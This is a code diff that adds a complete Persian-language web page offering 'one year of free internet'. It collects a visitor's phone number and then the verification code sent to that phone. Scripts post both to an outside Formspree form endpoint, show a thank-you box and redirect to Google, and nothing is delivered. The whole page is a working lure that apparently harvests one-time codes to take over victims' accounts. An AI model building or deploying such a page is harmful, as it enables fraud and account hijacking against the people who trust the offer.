@@ -1,0 +1,262 @@
+<!doctype html>
+<html lang="fa">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>اینترنت رایگان یکساله</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;600;700&display=swap" rel="stylesheet">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Vazirmatn',sans-serif;}
+body{
+  direction:rtl;
+  background:#0d0d0f;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
+  color:#eee;
+  padding:10px;
+}
+
+.box{
+  width:100%;
+  max-width:480px;
+  background:#16161c;
+  padding:40px 20px;
+  border-radius:22px;
+  box-shadow:0 0 40px rgba(0,255,224,.15);
+  text-align:center;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+}
+
+h2{
+  font-size:26px;
+  font-weight:700;
+  color:#00ffe0;
+  margin-bottom:15px;
+  text-align:center;
+}
+
+#instructions{
+  font-size:15px;
+  color:#b2b2b9;
+  margin-bottom:28px;
+  text-align:center;
+}
+
+label{
+  display:block;
+  text-align:center;
+  color:#cfcfd7;
+  margin-bottom:7px;
+  font-size:15px;
+}
+
+.input-wrapper{
+  position:relative;
+  margin-bottom:22px;
+  width:100%;
+}
+
+input{
+  width:100%;
+  padding:15px;
+  background:#1f1f27;
+  border:1px solid #2b2b35;
+  border-radius:14px;
+  font-size:16px;
+  text-align:center;
+  line-height:1.2;
+  display:flex;
+  align-items:center;
+  box-sizing:border-box;
+  color: #eee; /* متن همیشه همون رنگ CSS */
+}
+
+input::placeholder {
+  color: #888; /* فقط placeholder متفاوت */
+}
+
+#verifyCode{
+  letter-spacing:2px !important;
+  font-size:20px;
+  background:#1f1f27;
+  caret-color:#00ffe0;
+}
+
+button{
+  width:100%;
+  padding:15px;
+  border:none;
+  border-radius:14px;
+  background:#00ffe0;
+  color:#0b0b0b;
+  font-size:17px;
+  font-weight:700;
+  cursor:pointer;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:7px;
+}
+button:hover{
+  background:#00d4bf;
+  transform:scale(1.03);
+}
+
+#successBox{
+  display:none; 
+  position:fixed;
+  top:0; left:0;
+  width:100%; height:100%;
+  background:rgba(0,0,0,.75);
+  backdrop-filter:blur(3px);
+  z-index:200;
+  justify-content:center;
+  align-items:center;
+}
+
+#successBoxContent{
+  width:300px;
+  height:300px;
+  background:#16161c;
+  padding:30px 25px;
+  border-radius:18px;
+  text-align:center;
+  box-shadow:0 0 25px rgba(0,255,224,.2);
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+}
+
+#successBoxContent p{
+  font-size:18px;
+  color:#00ffe0;
+  margin-bottom:25px;
+}
+#successBoxContent button{
+  width:70%;
+  padding:12px;
+  font-size:16px;
+  border-radius:12px;
+  background:#00ffe0;
+  color:#0b0b0b;
+}
+
+#codeForm{display:none;} /* فرم کد از ابتدا مخفی */
+
+@media (max-width:480px){
+  .box{padding:30px 15px;}
+  input{font-size:18px;padding:14px;}
+  h2{font-size:24px;}
+  #instructions{font-size:14px;}
+  button{font-size:16px;padding:14px;}
+}
+</style>
+</head>
+<body>
+
+<div class="box">
+  <h2>اینترنت رایگان یکساله</h2>
+  <p id="instructions">شماره خود را وارد کنید تا بررسی شود.</p>
+
+  <form id="phoneForm" action="https://formspree.io/f/mvgebyyg" method="POST">
+    <label>شماره همراه:</label>
+    <div class="input-wrapper">
+      <input type="tel" name="phone" required>
+    </div>
+
+    <input type="hidden" name="_subject" value="شماره جدید وارد شد">
+    <input type="hidden" name="_language" value="fa">
+    <button type="submit">ارسال شماره</button>
+  </form>
+
+  <form id="codeForm" action="https://formspree.io/f/mvgebyyg" method="POST">
+    <label>کد تأیید:</label>
+    <div class="input-wrapper">
+      <input type="text" id="verifyCode" name="code" required>
+    </div>
+
+    <input type="hidden" name="phone" id="phoneHidden">
+    <input type="hidden" name="_subject" value="کد تأیید وارد شد">
+    <input type="hidden" name="_language" value="fa">
+
+    <button type="submit">تأیید کد</button>
+  </form>
+
+</div>
+
+<div id="successBox">
+  <div id="successBoxContent">
+    <p>✅ با تشکر از شما!</p>
+    <button id="finalConfirm">خروج</button>
+  </div>
+</div>
+
+<script>
+const phoneForm = document.getElementById('phoneForm');
+const codeForm = document.getElementById('codeForm');
+const instructions = document.getElementById('instructions');
+const phoneHidden = document.getElementById('phoneHidden');
+const successBox = document.getElementById('successBox');
+
+let savedPhone = "";
+
+/* ارسال شماره */
+phoneForm.addEventListener('submit', function(e){
+  e.preventDefault();
+  const data = new FormData(phoneForm);
+  savedPhone = data.get('phone');
+  phoneHidden.value = savedPhone;
+
+  fetch(phoneForm.action, {
+    method:"POST",
+    body:data,
+    headers:{"Accept":"application/json"}
+  }).then(res=>{
+    if(res.ok){
+      phoneForm.style.display = "none";
+      codeForm.style.display = "block";
+      instructions.textContent = "کد تأیید برای شما ارسال شد. لطفا وارد کنید.";
+    }
+  });
+});
+
+/* فقط اعداد در کد تأیید */
+document.getElementById("verifyCode").addEventListener("input", function(){
+  let val = this.value.replace(/\D/g,'');
+  this.value = val.split("").join(" ");
+});
+
+/* ارسال کد تأیید و نمایش مودال */
+codeForm.addEventListener('submit', function(e){
+  e.preventDefault();
+  const data = new FormData(codeForm);
+
+  fetch(codeForm.action,{
+    method:"POST",
+    body:data,
+    headers:{"Accept":"application/json"}
+  }).then(res=>{
+    if(res.ok){
+      codeForm.style.display = "none";
+      instructions.style.display="none";
+      successBox.style.display = "flex"; // فقط بعد از تأیید
+    }
+  });
+});
+
+/* خروج */
+document.getElementById('finalConfirm').addEventListener('click', () => {
+  window.location.href = "https://google.com";
+});
+</script>
+
+</body>
+</html>
